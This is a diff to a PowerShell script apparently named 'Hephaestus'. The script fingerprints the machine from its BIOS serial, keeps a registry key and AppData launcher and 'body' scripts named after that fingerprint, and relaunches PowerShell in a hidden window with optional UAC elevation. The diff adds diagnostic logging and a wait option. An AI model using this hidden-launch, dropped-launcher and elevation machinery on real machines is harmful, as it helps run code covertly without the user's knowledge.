@@ -14,13 +14,13 @@ function IsDebug {
     }
 }
 
-$machineCode = ""
+$script:machineCode = ""
 
 function Get-MachineCode {
 
-    if ([string]::IsNullOrEmpty($machineCode) -eq $false)
+    if (-not [string]::IsNullOrEmpty($script:machineCode))
     {
-        return $machineCode
+        return $script:machineCode
     }
     try {
         $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber
@@ -36,13 +36,13 @@ function Get-MachineCode {
         # Convert to Base64 and take the first 12 characters
         $hashString = [Convert]::ToBase64String($hashBytes) -replace "[^a-zA-Z0-9]", ""  # Remove non-alphanumeric characters
         
-        $machineCode = $hashString.Substring(0, 12)
+        $script:machineCode = $hashString.Substring(0, 12)
     }
     catch 
     {
-        $machineCode = "Hephaestus"
+        $script:machineCode = "Hephaestus"
     }
-    return $machineCode
+    return $script:machineCode
 }
 
 $hepaestusReg = "HKCU:\Software\$($(Get-MachineCode))"
@@ -177,11 +177,34 @@ function SmartServerlUrl{
 
 function writedbg {
     param (
-        [string]$msg,   [string]$msg2=""
+        [Parameter(Position = 0)]
+        [string] $msg = "",
+        [Parameter(Position = 1)]
+        [string] $msg2 = "",
+        [string] $ForegroundColor = $null
     )
-        if ($globalDebug){
-            Write-Host $msg + $msg2
+    $line = if ([string]::IsNullOrEmpty($msg2)) { [string]$msg } else { [string]$msg + [string]$msg2 }
+    $stamp = (Get-Date).ToString("o")
+    $record = "[$stamp] $line"
+
+    if ($PSBoundParameters.ContainsKey("ForegroundColor") -and -not [string]::IsNullOrWhiteSpace($ForegroundColor)) {
+        Write-Host $record -ForegroundColor $ForegroundColor
+    }
+    else {
+        Write-Host $record
+    }
+
+    try {
+        $dir = Get-HephaestusFolder
+        if (-not (Test-Path -LiteralPath $dir)) {
+            [void][System.IO.Directory]::CreateDirectory($dir)
         }
+        $logPath = Get-HephaestusDiagLogPath
+        [System.IO.File]::AppendAllText($logPath, $record + [Environment]::NewLine)
+    }
+    catch {
+        try { [Console]::Error.WriteLine("writedbg: log file append failed: $_ | $record") } catch { }
+    }
 }
 
 function Get-HephaestusFolder {
@@ -190,11 +213,11 @@ function Get-HephaestusFolder {
     return $hephaestusFolder
 }
 
-function Get-HolderPath {
+# Persisted copy of the last-run launcher (e.g. VBS drop) under AppData; used by extract_launcher.
+function Get-LauncherPath {
     $hephaestusFolder = Get-HephaestusFolder
     $scriptName = (Get-MachineCode) + '.' + 'ps1'
-    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
-    return $holderPath
+    return (Join-Path $hephaestusFolder -ChildPath $scriptName)
 }
 
 function Get-BodyPath {
@@ -202,6 +225,21 @@ function Get-BodyPath {
     $scriptName = (Get-MachineCode) + '_b.' + 'ps1'
     $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
     return $bodyPath
+}
+
+function Get-HephaestusDiagLogPath {
+    return (Join-Path (Get-HephaestusFolder) "hephaestus_diag.log")
+}
+
+function Reset-HephaestusDiagLog {
+    try {
+        $dir = Get-HephaestusFolder
+        if (-not (Test-Path -LiteralPath $dir)) {
+            [void][System.IO.Directory]::CreateDirectory($dir)
+        }
+        [System.IO.File]::WriteAllText((Get-HephaestusDiagLogPath), "", [System.Text.UTF8Encoding]::new($false))
+    }
+    catch { }
 }
 
 function Test-Arg{ param ([string]$arg)
@@ -431,7 +469,8 @@ function RunMe {
         [bool] $repassArgs,
         [string]$argName,
         [string]$argValue,
-        [bool]$uac
+        [bool]$uac,
+        [bool]$Wait = $false
     )
 
     $argName = EnsureDashPrefix -value $argName
@@ -478,22 +517,30 @@ function RunMe {
     $workDir = Split-Path -Parent -Path $scriptPath
     if ([string]::IsNullOrEmpty($workDir)) { $workDir = $PWD.Path }
 
-    if ($globalDebug)
-    {
-        if ($uac -eq $true) {
-            Start-Process powershell.exe -Verb RunAs -WindowStyle Normal -WorkingDirectory $workDir -ArgumentList $argumentList
-        } else {
-            Start-Process powershell.exe -WindowStyle Normal -WorkingDirectory $workDir -ArgumentList $argumentList
-        }
+    $style = $(if ($globalDebug) { "Normal" } else { "Hidden" })
+    $sp = @{
+        FilePath         = "powershell.exe"
+        WorkingDirectory = $workDir
+        WindowStyle      = $style
+        ArgumentList     = $argumentList
     }
-    else 
-    {
-        if ($uac -eq $true) {
-            Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -WorkingDirectory $workDir -ArgumentList $argumentList
-        } else {
-            Start-Process powershell.exe -WindowStyle Hidden -WorkingDirectory $workDir -ArgumentList $argumentList
+    if ($uac -eq $true) { $sp["Verb"] = "RunAs" }
+
+    if ($Wait) {
+        $proc = Start-Process @sp -PassThru -Wait -ErrorAction Stop
+        if ($null -eq $proc) {
+            throw "Start-Process returned null"
         }
+        if ($uac -eq $true -and $proc.HasExited) {
+            $xc = $proc.ExitCode
+            # User clicked No on UAC, or elevation was cancelled (0x800704C7 = -2147023673).
+            if ($xc -eq 1223 -or $xc -eq -2147023673) {
+                throw "UAC elevation cancelled (exit $xc)"
+            }
+        }
+        return $proc
     }
+    Start-Process @sp
 
 }
 
